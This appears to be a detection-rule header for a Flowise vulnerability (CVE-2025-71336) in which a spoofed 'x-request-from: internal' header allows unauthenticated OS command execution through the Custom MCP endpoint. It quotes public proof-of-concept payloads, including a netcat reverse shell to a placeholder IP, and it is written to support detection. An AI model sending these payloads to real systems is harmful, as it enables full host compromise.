title: Flowise Custom MCP -- T1059 x-request-from header spoof unsandboxed RCE
author: WinstonRedGuard -- sigma plugin observed rules (derived from breach corpus)
description:
Vendor-disclosed detection for CVE-2025-71336 (GHSA-6933-jpx5-q87q,
CVSS 9.3 CRITICAL), a self-reported advisory for Flowise, an
enhanced ChatGPT-clone / low-code AI-agent builder.

Prior to 3.0.6, Flowise's Custom MCP feature -- designed to execute OS
commands to launch local MCP servers -- was reachable without
authentication (the default installation runs unauthenticated unless
`FLOWISE_USERNAME`/`FLOWISE_PASSWORD` are explicitly set) by sending a
crafted request carrying the header `x-request-from: internal` to
`POST /api/v1/node-load-method/customMCP`. The request body's
`mcpServerConfig.command`/`args` fields are executed directly as an OS
process. Publicly documented PoC payloads (VulnCheck) demonstrate both a
file-write probe (`{"inputs":{"mcpServerConfig":{"command":"touch",
"args":["/tmp/yofitofi"]}},"loadMethod":"listActions"}`) and a reverse
shell (`{"inputs":{"mcpServerConfig":{"command":"nc","args":["<IP>",
"<PORT>","-e","/bin/sh"]}},"loadMethod":"listActions"}`) -- complete
container/host compromise from a single unauthenticated HTTP request.

Detection logic flags exactly this combination: a POST to the
`customMCP` node-load-method endpoint carrying the internal-request
spoof header, whose body's `mcpServerConfig.command` field names an
arbitrary-execution-capable binary rather than a fixed, allow-listed MCP
server launcher.

Aggregated from 2 independent technical sources (FlowiseAI's own GHSA
advisory + VulnCheck's corroborating PoC write-up with the payloads
quoted above), fixed in 3.0.6.
